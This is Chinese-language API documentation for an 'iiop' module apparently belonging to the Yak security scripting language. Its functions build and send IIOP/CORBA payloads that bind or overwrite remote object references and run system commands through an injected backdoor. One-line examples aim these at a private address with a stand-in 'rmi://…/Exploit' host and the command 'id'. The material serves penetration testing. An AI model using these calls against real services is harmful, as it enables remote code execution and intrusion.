# iiop

|函数名|函数描述/介绍|
|:------|:--------|
| [iiop.BindPayload](#bindpayload) |BindPayload 生成一个 IIOP bind 操作的 payload，用于向目标 CORBA/IIOP 服务绑定一个远程对象引用 参数: - rmi: 要绑定的远程对象引用地址（如 rmi/ldap 地址） 返回值: - 一个 payload 生成器，配合 iiop.SendPayload ...|
| [iiop.InvokePayload](#invokepayload) |InvokePayload 生成一个 IIOP 远程命令执行 payload 生成器，通过注入并调用远程后门对象执行系统命令 参数: - backDoor: 后门对象的名称/标识 - cmd: 需要在目标上执行的系统命令 返回值: - 一个 payload 生成器，配合 iiop.SendPaylo...|
| [iiop.RebindPayload](#rebindpayload) |RebindPayload 生成一个 IIOP rebind 操作的 payload，用于重新绑定（覆盖）目标服务上的远程对象引用 参数: - rmi: 要重新绑定的远程对象引用地址（如 rmi/ldap 地址） 返回值: - 一个 payload 生成器，配合 iiop.SendPayload 使...|
| [iiop.SendPayload](#sendpayload) |SendPayload 连接目标 IIOP/CORBA 服务并执行指定的 payload 生成器（如 bind、rebind、命令执行） 参数: - addr: 目标 IIOP 服务地址，格式为 host:port - sendPayload: 由 iiop.BindPayload、iiop.Reb...|


## 函数定义
### BindPayload

#### 详细描述
BindPayload 生成一个 IIOP bind 操作的 payload，用于向目标 CORBA/IIOP 服务绑定一个远程对象引用

参数:

  - rmi: 要绑定的远程对象引用地址（如 rmi/ldap 地址）



返回值:

  - 一个 payload 生成器，配合 iiop.SendPayload 使用




Example:

``````````````yak
// 通过 IIOP bind 注入远程引用，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.BindPayload("rmi://127.0.0.1:1099/Exploit"))~
``````````````


#### 定义

`BindPayload(rmi string) PayloadGeneraterFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| rmi | `string` | 要绑定的远程对象引用地址（如 rmi/ldap 地址） |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `PayloadGeneraterFun` | 一个 payload 生成器，配合 iiop.SendPayload 使用 |


### InvokePayload

#### 详细描述
InvokePayload 生成一个 IIOP 远程命令执行 payload 生成器，通过注入并调用远程后门对象执行系统命令

参数:

  - backDoor: 后门对象的名称/标识

  - cmd: 需要在目标上执行的系统命令



返回值:

  - 一个 payload 生成器，配合 iiop.SendPayload 使用




Example:

``````````````yak
// 通过 IIOP 注入后门并执行命令，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.InvokePayload("backdoor", "id"))~
``````````````


#### 定义

`InvokePayload(backDoor string, cmd string) PayloadGeneraterFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| backDoor | `string` | 后门对象的名称/标识 |
| cmd | `string` | 需要在目标上执行的系统命令 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `PayloadGeneraterFun` | 一个 payload 生成器，配合 iiop.SendPayload 使用 |


### RebindPayload

#### 详细描述
RebindPayload 生成一个 IIOP rebind 操作的 payload，用于重新绑定（覆盖）目标服务上的远程对象引用

参数:

  - rmi: 要重新绑定的远程对象引用地址（如 rmi/ldap 地址）



返回值:

  - 一个 payload 生成器，配合 iiop.SendPayload 使用




Example:

``````````````yak
// 通过 IIOP rebind 覆盖远程引用，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.RebindPayload("rmi://127.0.0.1:1099/Exploit"))~
``````````````


#### 定义

`RebindPayload(rmi string) PayloadGeneraterFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| rmi | `string` | 要重新绑定的远程对象引用地址（如 rmi/ldap 地址） |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `PayloadGeneraterFun` | 一个 payload 生成器，配合 iiop.SendPayload 使用 |


### SendPayload

#### 详细描述
SendPayload 连接目标 IIOP/CORBA 服务并执行指定的 payload 生成器（如 bind、rebind、命令执行）

参数:

  - addr: 目标 IIOP 服务地址，格式为 host:port

  - sendPayload: 由 iiop.BindPayload、iiop.RebindPayload、iiop.InvokePayload 等生成的 payload 生成器



返回值:

  - 错误信息，连接失败或执行失败时返回非空




Example:

``````````````yak
// 连接目标并执行 IIOP payload，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.InvokePayload("backdoor", "id"))~
``````````````


#### 定义

`SendPayload(addr string, sendPayload PayloadGeneraterFun) error`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| addr | `string` | 目标 IIOP 服务地址，格式为 host:port |
| sendPayload | `PayloadGeneraterFun` | 由 iiop.BindPayload、iiop.RebindPayload、iiop.InvokePayload 等生成的 payload 生成器 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `error` | 错误信息，连接失败或执行失败时返回非空 |


